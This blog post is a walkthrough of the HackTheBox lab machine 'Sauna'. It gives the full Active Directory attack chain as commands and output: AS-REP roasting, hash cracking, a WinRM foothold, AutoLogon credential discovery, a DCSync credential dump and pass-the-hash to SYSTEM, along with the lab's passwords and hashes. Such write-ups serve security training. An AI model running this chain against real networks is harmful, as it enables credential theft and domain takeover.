
---
title: "Sauna"
summary: "Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed. After enumeration, BloodHound reveals that a user has the *DS-Replication-Get-Changes-All* extended right, which allows to perform a DCSync attack."
categories: ["Post","Blog",]
tags: ["hackthebox machine"]
#externalUrl: ""
#showSummary: true
draft: false
date: 2025-01-31

---

| Machine Info         |              |
| -------------------- | ------------ |
| **Platform**         | HackTheBox   |
| **Operative System** | Windows      |
| **Difficulty**       | Easy         |
| **IP**               | 10.10.10.175 |
- - -
## Enumeration

As always, we start with `Nmap`:

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.175 -oN ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 08:20 HST
Nmap scan report for 10.10.10.175
Host is up (0.043s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Egotistical Bank :: Home
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-13 02:20:58Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 8h00m29s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-01-13T02:21:**05**
```

First, we should take a look at port 80 to check the website.

## Generating usernames from the web
In the **about.html** page we found some possible usernames, which is quite valuable in Windows enviroments to test for AS-REP Roastable accounts.
![sauna1](/img/sauna/sauna1.png)

We can save the usernames on a text file and with tools like [username_generator](https://github.com/shroudri/username_generator) we can create a list of possible valid usernames.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ git clone https://github.com/shroudri/username_generator
Cloning into 'username_generator'...
remote: Enumerating objects: 16, done.
remote: Counting objects: 100% (16/16), done.
remote: Compressing objects: 100% (14/14), done.
Receiving objects: 100% (16/16), 6.38 KiB | 3.19 MiB/s, done.
Resolving deltas: 100% (2/2), done.
remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0)
                                                                                                                                                                                      
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ nano users.txt            
                                                                                                                                                                                      
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ python3 username_generator/username_generator.py -w users.txt 
fergus
smith
f.smith
f-smith
f_smith
f+smith
fsmith
fergussmith
smithfergus
fergus.smith
smith.fergus
hugo
bear
h.bear
h-bear
h_bear
h+bear
hbear
```

Nice! As said, we can try to do AS-REP Roast with these new usernames. Let's try!

## AS-REP Roast

**AS-REP Roasting** is an attack in _Active Directory_ that exploits user accounts with the **“Do not require Kerberos preauthentication”** setting enabled. In a normal Kerberos authentication process, preauthentication prevents unauthorized access by requiring the client to encrypt a timestamp with the user’s password hash before requesting authentication. 

However, when this protection is disabled, an attacker can request an AS-REP (Authentication Service Response) for the target account **without needing valid credentials**. The Domain Controller then responds with an encrypted AS-REP message containing a Ticket Granting Ticket (TGT), which is encrypted using the user’s password hash. We could capture this response and crack it offline using tools like **Hashcat**.

In this case, we can perform this type of attack with the impacket script **GetNPUsers**:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-GetNPUsers -request -usersfile mutated_users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4dcaa316dcec649688cb0371ea8277e9$64e3539a4e39c89428a623458153ba7e38f43a11ff14692160cfeb8471ccf26921ebdf5a6d6718a1f384326572845b0a86144ca9fe06b903e1c5b9d277f17b5c80dc1d9234d59f4bdf1173d8f8471cbfe7f4db197b9bd7ded4b15b85b73a138757cffbd3ff14f26bb0588702f2cc25c79c86411f613801ff2119a22e30cd7462c8abd608aa0390223d667920d57f81e0e8cbe9c1362c7d452fa6f16906c1ff351546f318838ba90baf85dd359c8a875659ab597b87b2d94bee275b5e4c997b2c660eb1500ee0cc1b7fe96578dbc4584a23ce64a58ec52f33a5fe62b0149fdf03607ac0e32423afd4b9776947eec5cfd6b3eb51340d66c47c34df3c4507158f69
```

Nice! It looks like we could retrieve the TGT. The next step is trying to crack it:

## Cracking the hash
In order to crack the hash, I'll use **HashCat** with the mode **18200**:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show

$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8bd01da689627922de7e2d6ae592cd1$7713ccb10f010cde184f5d25974bedb64b3eb853362a3b73f9bb8406522b7ad9181059c95150045f22eedf51f83456065cfb1e8b5047936fc8ee4056c01b987477608982b208eef831d7913e4bcb0df485f2e0795f2dc92af975286f96350f2aafd6068f7ab88f4fd00805c53d61faa8708573bb8e6669953aca2de57df74efc3f9e501abb678bb61b1ef6d95728d60b71ce9593a74e929951eb85bbb9abe96a1d46950f20417299f7f80af4288eac5b228d5d799b0de30bfc8957dad1c4deb416f1e70916a774aed53950d451c4e05f77630a5668f9eb7b38e7b4a36e7b9e43733dfe7b1ff019f05536bc0313fe428114020227b9ada3bdcc485ebc0e4db579:Thestrokes23
```

Great! We managed to get credentials. Let's try to get a shell as the user **fsmith**:
## FootHold
As the port **5985** is open, we can try to break in via WinRM:
```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23                       

*Evil-WinRM* PS C:\Users\FSmith\Documents> whoami
egotisticalbank\fsmith
```

## User Flag
Time to read the user flag:
```powershell
*Evil-WinRM* PS C:\Users\FSmith\Desktop> type user.txt
a6395453...b505308e
```
## Privilege Escalation
Now we have to search our way to elevate privileges. After a bit of enumeration, I ran **WinPEAS.exe**, which is a pretty good tools for searching for privesc paths.

The output that this program generates is quite big, but there is something that stands out:
```powershell

ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

More credentials! Let's see what we can do with these:
## BloodHound
In Active Directory machines I recommend running [BloodHound](https://s3ntinl.github.io/posts/bloodhound/) as is the easiest way to check for escalation paths.

![sauna2](/img/sauna/sauna2.png)

As we can see, the user **svc_loanmgr** has the right to do a **DCSync**. 
## DCSync
A **DCSync attack** is a technique in which an attacker abuses replication permissions in Active Directory to extract sensitive credentials. Normally, Domain Controllers synchronize user data among themselves using the **Directory Replication Service (DRS)**. However, if an attacker gains control over an account with **replication privileges**, such as a **Domain Admin** or an account with the **Replicating Directory Changes All** permission, they can impersonate a Domain Controller and request password hashes for any user, including **krbtgt**.

An this is essentially what we can do with the **svc_loanmgr** user. This time, we can use the **secretsdump** script from Impacket.

```bash
┌──(s3n㉿kali)-[~/Desktop/Box/recon]
└─$ sudo impacket-secretsdump 'EGOTISTICAL-BANK'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8e22e0a93dc3c341734c716a7144cc35
```

With the **DCSync** attack we managed to obtain the Administrator NTLM hash, which can be used with a tool such as **PSExec** to do a **Pass-The-Hash** type of login:

```bash
┌──(s3n㉿kali)-[/opt/bloodhound]
└─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.10.10.175
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\Desktop> whoami
nt authority\system
```

And the machine is rooted!

```powershell
C:\Users\Administrator\Desktop> type root.txt
13474821...26f0e113
```